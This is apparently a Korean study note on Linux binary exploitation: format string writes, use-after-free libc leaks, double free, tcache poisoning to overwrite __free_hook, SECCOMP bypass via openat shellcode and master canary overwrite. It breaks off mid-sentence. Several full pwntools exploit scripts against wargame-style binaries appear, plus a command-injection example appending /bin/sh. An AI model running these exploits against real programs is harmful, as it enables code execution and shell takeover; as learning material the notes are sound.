printf(\u0026quot;%s%n\u0026quot;); 은 %s 에서 출력된 문자의 길이만큼 %n 에 기록한다. printf 참조 버퍼의 크기가 크지 않아도 큰 수를 %n 에 담으려면 format string 의 width 설정을 이용한다. printf(\u0026quot;%30p\u0026quot;) 는 출력되는 길이가 30 이하라면 모자란 영역을 공백으로 채운다. 종합하면 1337 을 target 변수에 덮어쓰고 싶다면, \u0026quot;%1337s%8$n......\u0026quot; 이후에 target 변수의 주소 를 이어붙인 문장을 printf 가 출력하게 하면 된다. %1337s%8$n 은 rsp[0x10] 의 주소에 1337 값을 넣는 용도이다. ...... + target 변수의 주소 부분은 x64 구조의 시스템에서는 rsp[0x10] 위치에 target 변수의 주소 가 오도록 패딩을 넣은 문자열이다. 프로그램 상에서 read 함수 호출에서 받은 데이터가 rsp 에 쌓이고 printf 를 호출할 때 까지 rsp 에 유지됨을 gdb 로 확인 했기에 rsp[0x10] 에 데이터를 넣을 계획을 세운 것이다. pwntool 을 사용한 코드 예시이다. from pwn import *\rp = process(\u0026#34;./fsb_overwrite\u0026#34;)\relf = ELF(\u0026#39;./fsb_overwrite\u0026#39;)\r##########\r# 1. get address of \u0026#39;main + 112\u0026#39; from stack\r##########\r# send FSB payload\rp.sendline(b\u0026#34;%7$p\u0026#34;)\raddr_leak = int(p.recvline()[:-1], 16)\r##########\r# 2. calculate address main+112 in stack\r##########\r# calculate address of \u0026#39;main\u0026#39; function\raddr_main = addr_leak - 112\rprint(\u0026#39;addr_main:\u0026#39;, hex(addr_main))\r# calculate address of target variable \u0026#39;changeme\u0026#39;\r# \u0026#39;changeme\u0026#39; is 11660 away from \u0026#39;main\u0026#39;\r# addr_changeme = addr_main + 11660\raddr_changeme = addr_main + (elf.symbols[\u0026#39;changeme\u0026#39;] - elf.symbols[\u0026#39;main\u0026#39;])\rprint(\u0026#39;offset main:\u0026#39;, hex(elf.symbols[\u0026#39;main\u0026#39;]))\rprint(\u0026#39;offset changeme:\u0026#39;, hex(elf.symbols[\u0026#39;changeme\u0026#39;]))\rprint(\u0026#39;addr_changeme:\u0026#39;, hex(addr_changeme))\r##########\r# 3. overwrite \u0026#39;changeme\u0026#39; variable ##########\rpayload = b\u0026#34;%1337c%8$n\u0026#34;.ljust(16,b\u0026#39;A\u0026#39;)\rpayload += p64(addr_changeme)\rprint(\u0026#39;payload:\u0026#39;, payload)\r# 1337 길이의 어떤 문자를 출력하고(무슨 문자가 될지는 모름)\r# 1337을 rsp[0x18] 에 덮어쓰게 하기 위해 16자리까지는 FSB 유발 데이터 + dummy string 으로 채우고\r# 17자리부터 24자리까지 changeme 변수의 주소로 채운다.\r# 이렇게 되면 stack 에서 rsp[0] ~ rsp[16] 까지는 FSB 유발 데이터 + dummy string 이 들어가고\r# rsp[17] ~ rsp[24] 까지는 changeme 변수의 주소가 담기게 된다.\rp.sendline(payload)\rp.interactive() Use-After-Free 메모리를 해제하느라 free 를 호출하면 free 함수는 메모리를 ptmalloc 에 반환할 뿐, 메모리 영역을 초기화 하거나 포인터를 초기화 하지는 않는다.\nptmalloc 참조 free 함수를 호출 한 이후 포인터는 dangling pointer 가 되어 해제된 chunk 영역을 가리키게 된다.\ndangling pointer 를 활용하여 해제된 메모리에 접근하여 발생할 수 있는 보안 취약점을 UAF(Use-After-Free) 라 하며, dangling pointer 가 가리키는 메모리가 해제되기 전에 담고 있었던 데이터가 유출 될 수 있다.\nunsortedbin 의 첫 chunk 는 libc 영역의 특정 구역과 연결된다. 즉, 첫 chunk 의 fd 와 bk 영역에는 libc 영역의 주소가 기록된다는 점을 활용하여 libc_base 를 확인할 수 있다. ptmalloc 참조\nexploit 조건\nunsortedbin 에 들어갈 수 있는 크기의 heap 을 할당 할 수 있어야 한다. heap 을 원할 때 해제 할 수 있어야 한다. (unsorted bin 의 chunk 와 top chunk 와 붙지 않게 조절 필요) uaf 취약점이 있어야 한다. (heap 에서 함수 포인터 주소를 읽어 실행하는 구문 존재) 실행파일 및 소스코드 확보 exploit 방법\nlibc_base 와 특정 메모리의 fd 혹은 bk 간 거리(index) 를 찾아낸다.\ngdb에서 프로그램을 실행시킨 후 메모리를 할당하고 해제하여 unsortedbin 영역에 chunk 를 생성시키고, heap 명령으로 그 chunk 의 fd 나 bk 영역의 메모리를 추출한다. (1024 이상 메모리 할당 필요) Free chunk (largebins) | PREV_INUSE\rAddr: 0x555555559290\rSize: 0x510 (with flag bits: 0x511)\rfd: 0x7ffff7fb8010\rbk: 0x7ffff7fb8010\rfd_nextsize: 0x555555559290\rbk_nextsize: 0x555555559290 vmmap 을 사용해 libc_base 의 주소를 확인한다. (예시에서는 0x7ffff7dcb000) 0x555555559000 0x55555557a000 rw-p 21000 0 [heap]\r0x7fff4d31f000 0x7ffff7dcb000 rw-p aaaac000 0 [anon_7fff4d31f]\r0x7ffff7dcb000 0x7ffff7ded000 r--p 22000 0 /usr/lib/x86_64-linux-gnu/libc-2.31.so\r0x7ffff7ded000 0x7ffff7f65000 r-xp 178000 22000 /usr/lib/x86_64-linux-gnu/libc-2.31.so\r0x7ffff7f65000 0x7ffff7fb3000 r--p 4e000 19a000 /usr/lib/x86_64-linux-gnu/libc-2.31.so\r0x7ffff7fb3000 0x7ffff7fb7000 r--p 4000 1e7000 /usr/lib/x86_64-linux-gnu/libc-2.31.so\r0x7ffff7fb7000 0x7ffff7fb9000 rw-p 2000 1eb000 /usr/lib/x86_64-linux-gnu/libc-2.31.so\r0x7ffff7fb9000 0x7ffff7fbf000 rw-p 6000 0 [anon_7ffff7fb9]\r0x7ffff7fc9000 0x7ffff7fcd000 r--p 4000 0 [vvar] libc_base 주소에서 fd 에 저장된 주소를 빼고, 96 의 offset을 추가로 빼서 libc_base 와 fd 가 가리키는 주소 index 를 찾는다. 0x7ffff7fb8010 - 0x7ffff7dcb000 = 0x1ED010 index 는 상대적인 값이므로 프로그램일 다시 실행시켜 libc_base 의 메모리 주소가 랜덤하게 변경되어도, index 는 변하지 않는다. exploit 에 사용할 ROP chain 을 구한다.\none-gadget 을 이용할 수도 있다. libc 파일을 one-gadget으로 분석하면 아래와 같다. $ one_gadget /lib/x86_64-linux-gnu/libc.so.6\r0xe3afe execve(\u0026#34;/bin/sh\u0026#34;, r15, r12)\rconstraints:\r[r15] == NULL || r15 == NULL || r15 is a valid argv\r[r12] == NULL || r12 == NULL || r12 is a valid envp\r0xe3b01 execve(\u0026#34;/bin/sh\u0026#34;, r15, rdx)\rconstraints:\r[r15] == NULL || r15 == NULL || r15 is a valid argv\r[rdx] == NULL || rdx == NULL || rdx is a valid envp\r0xe3b04 execve(\u0026#34;/bin/sh\u0026#34;, rsi, rdx)\rconstraints:\r[rsi] == NULL || rsi == NULL || rsi is a valid argv\r[rdx] == NULL || rdx == NULL || rdx is a valid envp 이후 gdb 에서 i r 명령으로 레지스터 상황을 보고 조건에 맞는 one-gadget 을 선택한다. i r\ri r\rrax 0xfffffffffffffe00 -512\rrbx 0x3 3\rrcx 0x7ffff7ed91f2 140737352929778\rrdx 0x5555513f 1431654719\rrsi 0x7fff4d31f010 140734488506384\rrdi 0x0 0\rrbp 0x7fffffffdee0 0x7fffffffdee0\rrsp 0x7fffffffdeb8 0x7fffffffdeb8\rr8 0x6 6\rr9 0x6 6\rr10 0x555555556073 93824992239731\rr11 0x246 582\rr12 0x555555555140 93824992235840\rr13 0x7fffffffdff0 140737488347120\rr14 0x0 0\rr15 0x0 0\rrip 0x7ffff7ed91f2 0x7ffff7ed91f2 \u0026lt;__GI___libc_read+18\u0026gt;\reflags 0x246 [ PF ZF IF ]\rcs 0x33 51\rss 0x2b 43\rds 0x0 0\res 0x0 0\rfs 0x0 0\rgs 0x0 0 문제 해결 예제 코드 from pwn import *\rDUMMY_DATA = \u0026#39;A\u0026#39;\rOFFSET = 0x3ebca0\rONE_GADGET = 0x10a41c\r# p = process(\u0026#39;a.out\u0026#39;, env= {\u0026#34;LD_PRELOAD\u0026#34; : \u0026#34;libc-2.27.so\u0026#34;})\r# alloc1\rp.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#39;3\u0026#39;)\rp.sendlineafter(b\u0026#34;Size:\u0026#34;, b\u0026#39;1280\u0026#39;)\rp.sendafter(b\u0026#34;Data:\u0026#34;, DUMMY_DATA.encode())\rp.sendlineafter(b\u0026#34;idx:\u0026#34;, b\u0026#39;-1\u0026#39;)\r# alloc2 \u0026amp; free alloc1\rp.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#39;3\u0026#39;)\rp.sendlineafter(b\u0026#34;Size:\u0026#34;, b\u0026#39;1280\u0026#39;)\rp.sendafter(b\u0026#34;Data:\u0026#34;, DUMMY_DATA.encode())\rp.sendlineafter(b\u0026#34;idx:\u0026#34;, b\u0026#39;0\u0026#39;)\r# alloc 3 (reuse chunk of \u0026#39;alloc1\u0026#39;)\rp.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#39;3\u0026#39;)\rp.sendlineafter(b\u0026#34;Size:\u0026#34;, b\u0026#39;1280\u0026#39;)\rp.sendafter(b\u0026#34;Data:\u0026#34;, DUMMY_DATA.encode())\rp.recvuntil(b\u0026#39;Data: \u0026#39;)\rfd = u64(p.recvline()[:-1].ljust(8, b\u0026#39;\\x00\u0026#39;)) # fd 값 추출\rp.sendlineafter(b\u0026#34;idx:\u0026#34;, b\u0026#39;-1\u0026#39;) # 잔여 과정 처리\rprint(\u0026#39;fd:\u0026#39;, hex(fd))\roffset = OFFSET + ord(DUMMY_DATA) - (OFFSET\u0026amp;0xFF) # 덮어쓴 DUMMY_DATA값을 고려하여 계산한다.\rprint(\u0026#39;offset:\u0026#39;, hex(offset))\rlibc_base = fd - offset # 유출된 fd 값으로 libc_base 값 계산\rprint(\u0026#39;libc_base:\u0026#39;, hex(libc_base))\rgadget = libc_base + ONE_GADGET\rprint(\u0026#39;gadget:\u0026#39;, hex(gadget))\r# alloc struct1\rp.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#39;1\u0026#39;)\rp.sendlineafter(b\u0026#34;Weight:\u0026#34;, b\u0026#39;1\u0026#39;)\rp.sendlineafter(b\u0026#34;Age:\u0026#34;, str(gadget).encode()) # 특정 구역에 gadget 주입\r# alloc struct2\rp.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#39;2\u0026#39;)\rp.sendlineafter(b\u0026#34;Weight:\u0026#34;, b\u0026#39;1\u0026#39;)\r# struct1 의 Age 영역이 strucut2 구역서는 함수 포인터이다. 아까 주입한 gadget 이 실행된다.\rp.interactive() Doubly Free Bug ptmalloc2 시스템에서 이미 free 를 호출하여 tcache 나 bins 에 포함된 chunk 를 한번 더 free 하여 취약점을 발생시키는 공격 기법이다. 공격자가 임의의 주소를 read / write / execute 할 수 있고, Denial of Service 도 수행할 수 있다. 특정 포인터에 대해 free 를 호출한 후 초기화를 하지 않으면 dangling pointer 가 생성된다. dangling pointer 를 한 번 더 free 하게 되면 tcache 나 bin 에 동일한 내용의 새로운 chunk 가 추가된다. 1. alloc\rbins heap\r- [chunk1]\r2. free\rbins heap\r[chunk1] -\r3. free again\rbins heap\r[chunk1] -\r[chunk1]\r4. alloc same size\rbins heap\r[chunk1] [chunk1]\r# 같은 주소 영역이 bin 과 heap 에 둘다 존재\r# heap 영역에 있는 [chunk1] 의 fd 위치와 bk 위치를 조작하면 bins 에 임의의 주소를 추가할 수 있다. glibc 2.26에서 많이 사용된 공격 기법이지만, 최신 libc 에서는 중복 free 를 방지하는 코드가 있어, 우회하지 않으면 프로그램이 자동으로 종료된다. free 된 chunk 들은 chunk + 8 영역에 tcache_entry 구조체를 갖게 된다. tcache_entry 는 free 할 때 tcache_perthread 값으로 설정되고, 할당 될 때 다시 초기화 된다. tcache_perthread 는 thread 마다 갖고 있는 구조체로, tcache 에 배정된 chunk list 를 관리한다. chunk 를 free 할 때 chunk 의 tcache_entry 부분이 tcache_perthread 와 일치하지 않으면 보호기법을 우회할 수 있다. #include \u0026lt;stdio.h\u0026gt;\r#include \u0026lt;stdlib.h\u0026gt;\rint main() {\rvoid *chunk = malloc(0x20);\rprintf(\u0026#34;Chunk to be double-freed: %p\\n\u0026#34;, chunk);\rfree(chunk);\r*(char *)(chunk + 8) = 0xff; // tcache_entry 구조체(chunk-\u0026gt;key) 의 주소를 오염시킨다.\rfree(chunk); // 변조를 했기 때문에 한 번 더 free 가 가능하다.\rprintf(\u0026#34;First allocation: %p\\n\u0026#34;, malloc(0x20));\rprintf(\u0026#34;Second allocation: %p\\n\u0026#34;, malloc(0x20));\rreturn 0;\r} Tcache Poisoning Doubly Free Bug 취약점을 활용하여 tcache 를 조작하는 공격 기법이다.\n2회 이상 free 된 chunk 를 재할달 하면 임의 주소에 chunk 를 할당시키는 (tcache 조작) 할 수 있다.\nAAR(Arbitrary Address Read) : 임의의 주소를 읽을 수 있음 AAW(Arbitrary Address Write) : 임의의 주소에 쓸 수 있음 exploit 방법은 아래와 같다.\n조건:\ndouble free 취약점 존재 실행파일 및 소스코드 확보 코드상 stdout 호출 stdout 은 libc 에 정의된 값으로, 코드상에서 이를 호출하면 .bss 영역에 libc 영역을 가리키는 주소 _IO_2_1_stdout_ 가 담기게 된다. 절차:\nAAR(Arbitrary Address Read) 로 libc_base 주소를 추출한다. AAW(Arbitrary Address Write) 로 hook 을 overwrite 한다. readelf -s 로 __free_hook 의 주소를 찾는다. 221: 00000000003ed8e8 8 OBJECT WEAK DEFAULT 35 __free_hook@@GLIBC_2.2.5 문제 해결 예제코드\nfrom pwn import *\rPROGRAM = \u0026#39;tcache_poison\u0026#39;\rPAYLOAD = \u0026#39;A\u0026#39;\rGADGET = 0x4f432\rp = process(PROGRAM)\re = ELF(PROGRAM)\rlib = ELF(\u0026#39;libc-2.27.so\u0026#39;)\r###############\r# 1. Doubly free memory\r###############\r# alloc chunk1\rp.sendlineafter(b\u0026#39;Edit\\n\u0026#39;, b\u0026#39;1\u0026#39;)\rp.sendlineafter(b\u0026#39;Size:\u0026#39;, b\u0026#39;50\u0026#39;)\rp.sendafter(b\u0026#39;Content:\u0026#39;, PAYLOAD.encode())\r# tcache: (*) -\u0026gt; NULL\r# --------------------------\r# free chunk1\rp.sendlineafter(b\u0026#39;Edit\\n\u0026#39;, b\u0026#39;2\u0026#39;)\r# tcache: (*) -\u0026gt; chunk1\r# --------------------------\r# edit chunk1 (already freed)\rp.sendlineafter(b\u0026#39;Edit\\n\u0026#39;, b\u0026#39;4\u0026#39;)\rp.sendafter(b\u0026#39;Edit chunk:\u0026#39;, b\u0026#39;A\u0026#39; * 8 + b\u0026#39;\\x00\u0026#39;) # corrupt tcache_entry to free again\r# free chunk1 again \u0026lt;- Doubly Free Bug\rp.sendlineafter(b\u0026#39;Edit\\n\u0026#39;, b\u0026#39;2\u0026#39;)\r# 이제 tcache 에는 동일한 메모리 주소를 가리키는 두 개의 chunk 가 생겼다.\r# tcache: (*) -\u0026gt; chunk1 -\u0026gt; chunk1\r# --------------------------\r###############\r# 2. Poison tcache ###############\roffset_stdout = e.symbols[\u0026#39;stdout\u0026#39;]\rprint(\u0026#39;offset_stdout:\u0026#39;, hex(offset_stdout))\rp.sendlineafter(b\u0026#39;Edit\\n\u0026#39;, b\u0026#39;1\u0026#39;)\rp.sendlineafter(b\u0026#39;Size:\u0026#39;, b\u0026#39;50\u0026#39;)\rp.sendafter(b\u0026#39;Content:\u0026#39;, p64(offset_stdout))\r# tcache: (*) -\u0026gt; chunk1 -\u0026gt; stdout -\u0026gt; _IO_2_1_stdout_ -\u0026gt; ... # --------------------------\r# pop chunk1 from tcache\rp.sendlineafter(b\u0026#39;Edit\\n\u0026#39;, b\u0026#39;1\u0026#39;)\rp.sendlineafter(b\u0026#39;Size:\u0026#39;, b\u0026#39;50\u0026#39;)\rp.sendafter(b\u0026#39;Content:\u0026#39;, PAYLOAD.encode())\r# tcache: (*) -\u0026gt; stdout -\u0026gt; _IO_2_1_stdout_ -\u0026gt; ... # --------------------------\r# pop stdout\r# stdout 의 실제 값에 영향을 주지 않고 프로그램 로직을 통해 tcache 에서 stdout 를 pop 하려면\r# _IO_2_1_stdout_ 값을 그대로 write 해주면서 alloc 을 해야한다. # 전체를 write 하는 대신 마지막 byte 하나만 덮어써도 문제 없다.\rlsb_of__IO_2_1_stdout_ = p64(lib.symbols[\u0026#39;_IO_2_1_stdout_\u0026#39;])[0:1] # least significant byte of _IO_2_1_stdout_\rp.sendlineafter(b\u0026#39;Edit\\n\u0026#39;, b\u0026#39;1\u0026#39;)\rp.sendlineafter(b\u0026#39;Size:\u0026#39;, b\u0026#39;50\u0026#39;)\rp.sendafter(b\u0026#39;Content:\u0026#39;, lsb_of__IO_2_1_stdout_)\rprint(\u0026#39;lsb_of__IO_2_1_stdout_:\u0026#39;, lsb_of__IO_2_1_stdout_)\r# tcache: (*) -\u0026gt; _IO_2_1_stdout_ -\u0026gt; ... # --------------------------\r###############\r# 3. leak address into stdout\r###############\rp.sendlineafter(b\u0026#39;Edit\\n\u0026#39;, b\u0026#39;3\u0026#39;)\rp.recvuntil(b\u0026#39;Content: \u0026#39;)\raddr_stdout = u64(p.recv(6).ljust(8, b\u0026#39;\\x00\u0026#39;))\rprint(\u0026#39;addr_stdout:\u0026#39;, hex(addr_stdout))\rlibc_base = addr_stdout - lib.symbols[\u0026#39;_IO_2_1_stdout_\u0026#39;]\rprint(\u0026#39;libc_base:\u0026#39;, hex(libc_base))\r###############\r# 4. overwrite __free_hook\r###############\roffset_free_hook = lib.symbols[\u0026#39;__free_hook\u0026#39;]\rprint(\u0026#39;offset_free_hook:\u0026#39;, hex(offset_free_hook))\raddr_free_hook = libc_base + offset_free_hook\rprint(\u0026#39;addr_free_hook:\u0026#39;, hex(addr_free_hook))\r# 앞서 수행한 것 처럼, doubly free memory 를 한번 더 발생시킨다.\r# chunk1 과 다른 크기의 메모리를 할당해야 함에 주의한다\r# Doubly free memory\r# alloc chunk2\rp.sendlineafter(b\u0026#39;Edit\\n\u0026#39;, b\u0026#39;1\u0026#39;)\rp.sendlineafter(b\u0026#39;Size:\u0026#39;, b\u0026#39;80\u0026#39;)\rp.sendafter(b\u0026#39;Content:\u0026#39;, PAYLOAD.encode())\r# tcache: (*) -\u0026gt; NULL\r# --------------------------\r# free chunk2\rp.sendlineafter(b\u0026#39;Edit\\n\u0026#39;, b\u0026#39;2\u0026#39;)\r# tcache: (*) -\u0026gt; chunk2\r# --------------------------\r# edit chunk2 (already freed)\rp.sendlineafter(b\u0026#39;Edit\\n\u0026#39;, b\u0026#39;4\u0026#39;)\rp.sendafter(b\u0026#39;Edit chunk:\u0026#39;, b\u0026#39;A\u0026#39; * 8 + b\u0026#39;\\x00\u0026#39;) # corrupt tcache_entry to free again\r# free chunk2 again \u0026lt;- Doubly Free Bug\rp.sendlineafter(b\u0026#39;Edit\\n\u0026#39;, b\u0026#39;2\u0026#39;)\r# 이제 tcache 에는 동일한 메모리 주소를 가리키는 두 개의 chunk 가 생겼다.\r# tcache: (*) -\u0026gt; chunk2 -\u0026gt; chunk2\r# --------------------------\r# Poison tcache p.sendlineafter(b\u0026#39;Edit\\n\u0026#39;, b\u0026#39;1\u0026#39;)\rp.sendlineafter(b\u0026#39;Size:\u0026#39;, b\u0026#39;80\u0026#39;)\rp.sendafter(b\u0026#39;Content:\u0026#39;, p64(addr_free_hook))\r# tcache: (*) -\u0026gt; chunk2 -\u0026gt; __free_hook -\u0026gt; ...\r# --------------------------\r# pop chunk1 from tcache\rp.sendlineafter(b\u0026#39;Edit\\n\u0026#39;, b\u0026#39;1\u0026#39;)\rp.sendlineafter(b\u0026#39;Size:\u0026#39;, b\u0026#39;80\u0026#39;)\rp.sendafter(b\u0026#39;Content:\u0026#39;, PAYLOAD.encode())\r# tcache: (*) -\u0026gt; __free_hook -\u0026gt; ... # --------------------------\r# pop __free_hook \u0026amp; overwrite __free_hook with gadget\rp.sendlineafter(b\u0026#39;Edit\\n\u0026#39;, b\u0026#39;1\u0026#39;)\rp.sendlineafter(b\u0026#39;Size:\u0026#39;, b\u0026#39;80\u0026#39;)\rp.sendafter(b\u0026#39;Content:\u0026#39;, p64(libc_base + GADGET))\rprint(\u0026#39;gadget:\u0026#39;, hex(libc_base + GADGET))\r# tcache: (*) -\u0026gt; ... # --------------------------\r# call free (contaminated)\rp.sendlineafter(b\u0026#39;Edit\\n\u0026#39;, b\u0026#39;2\u0026#39;)\rp.interactive() Logical Error OS 나 컴파일러의 구조적 취약점 뿐 아니라 개발자의 실수에 의한 취약점도 exploit 에 사용될 수 있다. Type Error 변수에 담게 될 값의 크기, 용도, 부호 여부를 고려하지 않고 정의된 변수에 의해 의도치 않은 동작을 유발하는 에러 out of range : 변수에 담을 수 있는 범위를 벗어나는 값을 저장하여 값이 잘리거나 부호가 반전되는 현상 overflow : 값이 잘려서 예상 값보다 커지는 현상 (unsigned char 에 256 대입) underflow : 표현할 수 없는 값을 변수에 대입하여 예상 값보다 작아지는 현상 (unsigned int 에 -1 대입) Command Injection C 언어에서 system 함수를 사용하여 커널 명령어를 호출하도록 프로그래밍을 수행할 수 있다. system 함수는 execve 시스템 콜을 호출하게 된다. Metacharacter 를 이용해 특정 명령어 이후 \u0026ldquo;/bin/sh\u0026rdquo; 를 명령어로 입력하게 되면 쉘 권한을 탈취 당하게 된다. ex) system(\u0026quot;cat file.txt;/bin/sh\u0026quot;): 의도한 동작은 cat file.txt 까지지만, /bih/sh 를 추가로 호출하였다. Path Traversal 허용되지 않은 경로에 사용자가 접근할 수 있는 취약점 임의의 파일을 읽고/쓰고/실행 시킬 수 있는 위험이 있다. 프로그램에서 의도하지 않은 절대경로, 상대경로 상으로 접근이 불가능하도록 로직상 제약이 필요하다. Bypass SECCOMP mmap 을 이용하여 입력으로 받은 함수를 실행하도록 구현된 코드에서 exploit 을 위한 코드를 침투시킬 수 있으나, SECCOMP 기법으로 시스템콜을 차단함으로서 이를 방어할 수 있다. mmap 코드 예시 void *shellcode = mmap(0, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS, -1, 0);\rvoid (*sc)() = (void *)shellcode;\rsc(); SECCOMP는 특정 시스템 콜을 허용하거나 차단하여 의도하지 않은 시스템 콜의 호출을 막는 방어 기법이다. 하지만 시스템의 지속적인 개발에 의해 유사한 역할을 하는 다른 시스템콜들이 계속 생겨나고 있다. 예를들어 open 과 openat 은 동일한 역할을 수행하며, open을 차단한 프로그램이 openat을 차단하지 않았다면 이를 이용한 해킹이 가능하다. 하지만, 시스템 콜 간에도 의존성이 있기 때문에 의존성이 있는 시스템 콜이 차단된 경우에는 우회가 불가능 될 가능성이 크다. 반대로 특정 라이브러리 함수에 의존하는 함수를 SECCOMP 설정으로 허용 해 놓는다면, 그 함수 또한 허용 되어 있음을 암시적으로 알 수 있다. execve 함수는 내부적으로 openat 함수를 호출하고 있다. open, read, write 는 타 시스템 콜의 영향을 받지 않고 실행할 수 있는 함수이다. exploit 예시 open 함수를 막는 형태의 소스코드가 있을 떄, openat 를 사용하여 파일을 탈취하는 공격 방식이다. 코드 일부: seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(open), 0); 단, openat은 첫 번째 인자를 AT_FDCWD 로 설정해야 open과 동일한 효과를 낸다. openat 은 첫 번쨰 인자로 받은 file descriptor 에 해당하는 디렉터리에서 부터 상대 주소를 검색한다. 첫 번쨰 인자로 AT_FDCWD 를 입력하면 현재 작업 디렉터리를 기준으로 상대 주소를 검색하게 된다. #!/usr/bin/env python3\rfrom pwn import *\rcontext.arch = \u0026#39;x86_64\u0026#39; # 아키텍처 설정\r# p = process(\u0026#39;./bypass_seccomp\u0026#39;)\rdata = shellcraft.openat(\u0026#39;AT_FDCWD\u0026#39;, \u0026#34;./flag\u0026#34;) # AT_FDCWD 옵션을 넣어 현재 경로부터 상대 경로를 검색하도록 설정\rdata += \u0026#39;mov r10, 0xffff\u0026#39; # r10은 sendfile 호출시 전달할 데이터의 양을 뜻한다.\rdata += shellcraft.sendfile(1, \u0026#39;rax\u0026#39;, 0).replace(\u0026#39;xor r10d, r10d\u0026#39;,\u0026#39;\u0026#39;)# sendfile 호출시 `xor r10d, r10d` 구문이 자동으로 들어가서 r10을 초기화하므로 이를 제거한다.\r# data += shellcraft.exit(0)\r# print(data)\rdata = asm(data)\r# print(data)\rp.sendlineafter(b\u0026#34;shellcode:\u0026#34;, data)\rp.interactive() Master Canary 앞서 SSP(Stack Smash Protector) 의 한 종류로 stack canary를 배웠고, canary는 TLS(Thread Local Storage) 의 데이터를 사용하여 만들어진다.\nTLS 영역은 text, bss 영역과 달리 로더에서 생성하는 영역이다.\n로더에서 TLS 영역을 생성은 init_tls -\u0026gt; dl_allocate_tls_storage 함수에 의해 할당되고, arch_prctl 시스템 콜에서 ARCH_SET_FS 명령을 호출하여 FS segment register 가 TLS 영역을 가리키도록 초기화 한다.\nsegment register 한 프로그램의 모든 Stack Canary 는 FS segment register 의 0x28 번지에 위치하는 값을 사용하는데, FS segment는 TLS 로 초기화 되므로, FS:0x28 의 값은 TLS:0x28 의 값이다.\ngdb 에서 $fs_base 값은 FS segment register 를 의미한다. p/x $fs_base 명령으로 FS segment register 의 값을 확인 할 수 있다. 때문에 \u0026ldquo;TLS 주소에 0x28 바이트 만큼 떨어진 주소에 위치한 값\u0026rdquo;(TLS:0x28) 을 Master Canary 라 부른다.\ncanary 는 시스템의 pointer 크기와 같은 크기를 가지며, 첫 byte는 NULL 이다.\n_dl_setup_stack_chk_guard 함수에서 endian 에 따라 첫 byte를 NULL 로 설정한다. THREAD_SET_STACK_GUARD 매크로에서 TLS + 0x28 위치에 canary 값을 삽입한다. main thread 외 별도로 생성한 thread 에서 선언한 변수는 TLS 와 근접한 영역에 선언된다. 또한, 이 영역은 FS segment register 보다 낮은 주소에 위치하므로 master canary 의 값을 buffer overflow로 덮어 쓸 수 있다.\nexploit 예시 전제조건 : thread에 선언한 버퍼에 buffer overflow를 발생할 수 있다. exploit 순서 디버깅을 통해 matser canary 와 버퍼 사이의 간격을 확인한다. code 상에서 buffer 가 사용되는 부분을 어셈블리어에서 확인한다. // 원본 함수\rvoid thread_routine() {\rchar buf[256];\rint size = 0;\rprintf(\u0026#34;Size: \u0026#34;);\rscanf(\u0026#34;%d\u0026#34;, \u0026amp;size);\rprintf(\u0026#34;Data: \u0026#34;);\rread_bytes(buf, size);\r}\r// disass 결과\r0x0000000000401347 \u0026lt;+52\u0026gt;: call 0x4010f0 \u0026lt;printf@plt\u0026gt;\r0x000000000040134c \u0026lt;+57\u0026gt;: lea rax,[rbp-0x114]\r0x0000000000401353 \u0026lt;+64\u0026gt;: mov rsi,rax\r0x0000000000401356 \u0026lt;+67\u0026gt;: lea rdi,[rip+0xcb6] # 0x402013\r0x000000000040135d \u0026lt;+74\u0026gt;: mov eax,0x0\r0x0000000000401362 \u0026lt;+79\u0026gt;: call 0x401150 \u0026lt;__isoc99_scanf@plt\u0026gt;\r0x0000000000401367 \u0026lt;+84\u0026gt;: lea rdi,[rip+0xca8] # 0x402016\r0x000000000040136e \u0026lt;+91\u0026gt;: mov eax,0x0\r0x0000000000401373 \u0026lt;+96\u0026gt;: call 0x4010f0 \u0026lt;printf@plt\u0026gt;\r0x0000000000401378 \u0026lt;+101\u0026gt;: mov edx,DWORD PTR [rbp-0x114]\r// read_bytes 에서 사용될 첫 번째 인자 \u0026#39;buf\u0026#39; 가 rax 에 적용 될 것이며, 이는 [rbp-0x110] 값이 대응된다.\r0x000000000040137e \u0026lt;+107\u0026gt;: lea rax,[rbp-0x110]\r0x0000000000401385 \u0026lt;+114\u0026gt;: mov esi,edx\r0x0000000000401387 \u0026lt;+116\u0026gt;: mov rdi,rax\r0x000000000040138a \u0026lt;+119\u0026gt;: call 0x4012be \u0026lt;read_bytes\u0026gt; gdb 에서 thread_routine 함수까지 실행시킨 다음 $fs_base + 0x28 위치(canary가 저장된 FS segment register)의 주를 확인하고, overflow 가능한 버퍼와 거리를 측정한다. pwndbg\u0026gt; p/x ($rbp - 0x110)\r$1 = 0x7ffff7da3de0\rpwndbg\u0026gt; p/x ($fs_base + 0x28)\r$2 = 0x7ffff7da4728\rpwndbg\u0026gt; p/x 0x7ffff7da4728 - 0x7ffff7da3de0\r$3 = 0x948 버퍼에서 부터 canary까지(rbp - 0x110 ~ $fs_base + 0x28 + 0x8) 임의의 값(\u0026lsquo;AAAA\u0026hellip;\u0026rsquo;)으로 채워넣게 되면 SIGSEGV 에 의한 core dump가 발생할 수 있다. Coredump 확인 방법 stack 에서 버퍼 다음에는 다른 지역변수 값이 있을 텐데, 이를 모두 \u0026lsquo;AAAA\u0026hellip;\u0026rsquo; 로 채울 경우 변수 참조시 에러가 발생할 수 있다. thread 생성시 호출되는 __pthread_disable_asynccancel 함수에서 struct pthread *self = THREAD_SELF; 지역변수를 생성하고, self-\u0026gt;canceltype = PTHREAD_CANCEL_DEFERRED 구문을 호출한다. self-\u0026gt;canceltype의 주소가 \u0026lsquo;AAAA\u0026hellip;\u0026rsquo; 로 덮어써지면 segment fault 가 발생한다. gdb 명령어로 p \u0026amp;((struct pthread *) $fs_base)-\u0026gt;header.self 를 입력하여 이 값을 확인할 수 있다. THREAD_SELF 는 스레드의 Thread Descriptor을 가리키는 매크로이다. 버퍼로부터 ($fs_base)-\u0026gt;header.self-\u0026gt;canceltype 위치까지의 거리를 계산하고, self-\u0026gt;canceltype 이 rw 권한이 있는 곳을 가리키도록 버퍼에 적당한 값을 집어넣는다. disass 결과에 의하면 __pthread_disable_asynccancel 함수의 어셈블리 코드 mov byte ptr [rax + 0x972], 0 구문이 canceltype 을 대입하는 부분이고, 이떄 rax 는 fs 값이 채워져 